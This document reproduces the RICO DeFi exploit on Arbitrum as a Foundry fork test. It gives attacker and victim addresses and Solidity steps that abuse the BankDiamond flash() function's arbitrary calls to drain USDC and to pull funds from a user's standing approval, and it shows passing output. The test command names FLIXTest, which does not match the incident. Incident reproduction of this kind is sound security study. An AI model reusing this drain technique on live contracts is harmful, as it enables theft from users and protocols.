# RICO Attack Incident

## Information
+ Protocol Name: RICO
+ Total Loss: 36 K
+ Network: Arbitrum
  
+ Attacker: 0xc91cb089084f0126458a1938b794aa73b9f9189d
+ Attack Contract: 0x68d843d31de072390d41bff30b0076bef0482d8f
+ Victim Contract: 0x598c6c1cd9459f882530fc9d7da438cb74c6cb3b
+ Transaction: 0x5d2a94785d95a740ec5f778e79ff014c880bcefec70d1a7c2440e611f84713d6

## Reproduction
1. Add funding token and configure block number:
```solidity
uint256 constant forkBlock = 202_973_712;
address constant fundToken = address(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
```

2. Add constant variable:
```solidity
address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
address constant BankDiamond = 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b;
address constant Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant Victim = 0x512E07A093aAA20Ba288392EaDF03838C7a4e522;
```

3. Add label in `setup` function
```solidity
vm.label(USDC, "USDC");
vm.label(BankDiamond, "BankDiamond");
vm.label(Router, "Router");
vm.label(Victim, "Victim");
```

4. Add necessary interface for victim contract
```solidity
interface IBankDiamond {
    function flash(address, bytes calldata) external returns (bytes memory result);
}
```

5. Execute exploit process:
Main Logic 1
```solidity
// Step 1: Execute flash loan and perform transfer operation
address token = USDC;
IBankDiamond(BankDiamond).flash(token, _getTransferData(token));
```

Helper function
```solidity
function _getTransferData(address token) internal view returns (bytes memory data) {
    uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
    data = abi.encodeWithSelector(IERC20.transfer.selector, address(this), tokenBalance);
}
```

Main Logic 2
```solidity
transferFromOwner(Victim, USDC);
```

Helper function
```solidity
function transferFromOwner(address owner, address token) internal {
    bytes memory callData = _getTransferFromData(token, owner);
    if (callData.length > 0) {
        IBankDiamond(BankDiamond).flash(token, callData);
    }
}

function _getTransferFromData(address token, address user) internal view returns (bytes memory data) {
    uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
    uint256 tokenAllowance = IERC20(token).allowance(user, BankDiamond);
    if (tokenBalance >= tokenAllowance) {
        data = abi.encodeWithSelector(IERC20.transferFrom.selector, user, address(this), tokenBalance);
    }
}
```

6. Run forge command and check the final result:

Command
```bash
forge test --mc FLIXTest -vvv
```

Result
```bash
[PASS] testExploit() (gas: 103727)
Logs:
  Attacker Token Balance Before Exploit:  0
  Attacker Token Balance After Exploit:  10375584869

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 538.11ms (2.09ms CPU time)
```